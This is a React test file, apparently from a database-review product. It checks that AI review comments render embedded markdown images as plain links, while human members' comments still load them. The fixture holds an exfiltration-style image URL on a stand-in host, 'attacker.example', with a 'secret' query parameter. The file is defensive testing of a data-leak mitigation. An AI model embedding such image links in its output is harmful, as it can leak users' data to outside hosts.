import { create } from "@bufbuild/protobuf";
import { cleanup, render, screen } from "@testing-library/react";
import type { ReactNode } from "react";
import { afterEach, describe, expect, test, vi } from "vitest";
import {
  type IssueComment,
  IssueComment_ReviewMetadata_Priority,
  IssueCommentSchema,
  IssueSchema,
  ReviewRun_Type,
} from "@/types/proto-es/v1/issue_service_pb";

const ISSUE = "projects/p/issues/1";

const mocks = vi.hoisted(() => ({
  comments: [] as IssueComment[],
}));

vi.mock("react-i18next", () => ({
  initReactI18next: { type: "3rdParty", init: () => {} },
  useTranslation: () => ({ t: (key: string) => key }),
}));

vi.mock("@/components/HumanizeTs", async () => ({
  ...(await import("@/test-utils/humanizeTs")).humanizeTsStub(),
}));

vi.mock("@/api", () => ({ issueServiceClientConnect: {} }));

vi.mock("@/app/router", () => ({ useCurrentRoute: () => ({ hash: "" }) }));

vi.mock("@/components/issue-activity/IssueCommentActivity", () => ({
  CommentCreator: () => null,
  canEditIssueComment: () => false,
  IssueCommentRow: ({ body }: { body: ReactNode }) => <li>{body}</li>,
}));

vi.mock("@/components/UserAvatar", () => ({ UserAvatar: () => null }));

vi.mock("@/hooks/useAppState", () => ({
  useCurrentUser: () => ({ email: "me@example.com", title: "Me" }),
}));

vi.mock("@/hooks/usePrincipal", () => ({
  principalLabel: () => "creator",
  usePrincipal: () => undefined,
}));

vi.mock("@/hooks/useProjectByName", () => ({
  useProjectByName: () => undefined,
}));

vi.mock("@/stores", () => ({ pushNotification: vi.fn() }));

vi.mock("@/stores/app", () => {
  const state = {
    batchGetOrFetchUsers: vi.fn(async () => undefined),
    fetchIssueCommentTimeline: vi.fn(async () => undefined),
    getIssueComments: () => mocks.comments,
    projectsByName: {},
  };
  const useAppStore = (selector: (s: typeof state) => unknown) =>
    selector(state);
  useAppStore.getState = () => state;
  return { useAppStore };
});

vi.mock("@/utils/iam/permission", () => ({
  hasProjectPermissionV2: () => false,
}));

vi.mock("../../plan-detail/components/PlanChangeReference", () => ({
  PlanSpecChangeReference: () => null,
}));

vi.mock("../../plan-detail/hooks/usePlanChangeReferenceData", () => ({
  usePlanChangeReferenceData: () => ({}),
}));

vi.mock("../context/IssueDetailContext", () => ({
  useIssueDetailContext: () => ({
    issue: create(IssueSchema, { name: ISSUE }),
    patchState: vi.fn(),
    projectId: "p",
    setEditing: vi.fn(),
  }),
}));

import { IssueDetailCommentList } from "./IssueDetailCommentList";

const LEAK = "https://attacker.example/leak.png?q=secret";
const TEXT = `Drop risk\n\n![chart](${LEAK})`;

const comment = (name: string, reviewMetadata?: boolean) =>
  create(IssueCommentSchema, {
    name: `${ISSUE}/issueComments/${name}`,
    comment: TEXT,
    reviewMetadata: reviewMetadata
      ? {
          runType: ReviewRun_Type.AI,
          priority: IssueComment_ReviewMetadata_Priority.P1,
          targets: ["instances/i/databases/d"],
        }
      : undefined,
  });

afterEach(() => {
  cleanup();
  mocks.comments = [];
});

describe("IssueDetailCommentList", () => {
  test("renders a review result without loading its images", () => {
    mocks.comments = [comment("result", true)];
    const { container } = render(<IssueDetailCommentList />);

    expect(screen.getByText("Drop risk")).toBeDefined();
    expect(container.querySelector("img")).toBeNull();
    expect(
      container.querySelector(`a[href="${LEAK}"]`)?.textContent
    ).toBe("chart");
  });

  test("renders a member's comment with its images, as before", () => {
    mocks.comments = [comment("member")];
    const { container } = render(<IssueDetailCommentList />);

    expect(container.querySelector("img")?.getAttribute("src")).toBe(LEAK);
  });
});
